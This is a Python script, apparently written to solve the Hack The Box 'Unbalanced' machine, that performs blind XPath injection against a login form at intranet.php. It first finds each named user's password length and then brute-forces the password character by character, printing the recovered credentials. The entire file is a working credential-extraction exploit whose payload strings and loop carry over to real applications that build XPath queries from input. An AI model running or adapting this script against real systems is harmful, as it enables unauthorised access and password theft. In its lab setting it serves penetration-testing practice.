import requests
import string

# with xpath injection and get user passwords from xml file
# I have writen this scrip for hackthebox unbalanced machine


users=['rita','sarah','jim','bryan']
#users=['rita']
data = {'Username':'','Password':''}
#proxies = {'http':'http://127.0.0.1:8080'}

chars=string.printable[:-5]

#find user passoerd lenght
def get_length_of_password(username):
	for i in range(1,33):
		payload=f"' or Username='{username}' and string-length(Password/text())={i} or '1'='2"
		data = {'Username':'','Password':payload}
		#r = requests.post('http://172.31.179.1/intranet.php',data=data,proxies=proxies)
		r = requests.post('http://172.31.179.1/intranet.php',data=data)
		if "Invalid credentials" not in r.text:
			return i

#compare user password char by char
def brute_char(username,pos):
	for char in chars:
		payload=f"' or Username='{username}' and substring(Password,{pos},1)='{char}"
		data = {'Username':'','Password':payload}
		#r = requests.post('http://172.31.179.1/intranet.php',data=data,proxies=proxies)
		r = requests.post('http://172.31.179.1/intranet.php',data=data)
		if "Invalid credentials" not in r.text:
			return char	

	return False

#get user passord
def get_user_password(username,password_length):
	user_pw=""
	for i in range(1,password_length+1):
		if char := brute_char(username,i):
			user_pw +=char
	return user_pw

#for all user get password
for user in users:
	pw_length = get_length_of_password(user)
	user_pw = get_user_password(user,pw_length)

	print(f"{user} password length is: {pw_length} and password is: {user_pw}")
	#print(user+' password length is: '+str(pw_length)+ ' and password is: '+user_pw)
	print()

	
